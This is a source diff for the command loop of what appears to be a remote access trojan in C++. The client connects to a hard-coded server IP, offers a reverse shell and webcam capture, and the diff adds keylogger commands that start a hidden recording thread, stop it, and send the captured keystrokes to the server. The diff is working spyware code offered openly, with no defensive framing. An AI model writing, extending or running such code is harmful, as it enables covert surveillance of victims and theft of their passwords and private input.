@@ -12,6 +12,7 @@
 #include "information/system/SystemInformation.h"
 #include "information/network/NetworkInformation.h"
 #include "reverse_shell/ReverseShell.h"
+#include "Keylogger/KeyLogger.h"
 
 #define IP "192.168.1.133"
 
@@ -70,6 +71,7 @@ int main() {
                 std::cout << "Connected to server!" << std::endl;
                 Stream stream(sock);
                 ReverseShell reverseShell;
+                KeyLogger keyLogger(stream);
                 while (streamListening) {
                     int action = stream.readSize();
                     switch (action) {
@@ -166,6 +168,24 @@ int main() {
                             stream.sendString(response.c_str());
                             break;
                         }
+                        case 12: {
+                            std::cout << "START KEYLOGGER" << std::endl;
+                            if (!keyLogger.isRecordingKeys()){
+                                keyLogger.setRecordingKeys(true);
+                                std::thread keyloggerThread(&KeyLogger::start, &keyLogger);
+                                keyloggerThread.detach();
+                            }
+                            break;
+                        } case 13:{
+                            std::cout << "STOP KEYLOGGER" << std::endl;
+                            if (keyLogger.isRecordingKeys()) keyLogger.setRecordingKeys(false);
+                            break;
+                        }
+                        case 14: {
+                            std::cout << "DUMP KEYLOGGER LOGS" << std::endl;
+                            keyLogger.sendKeyLoggerLogs();
+                            break;
+                        }
                         case 16: {
                             std::cout << "REQUEST DEVICES (CAMERA)" << std::endl;
                             DeviceEnumerator de;
@@ -180,6 +200,7 @@ int main() {
                             stream.sendList(webcamVector);
                             break;
                         }
+
                         case 17: {
                         #ifdef WEBCAM
                             std::cout << "START WEBCAM" << std::endl;
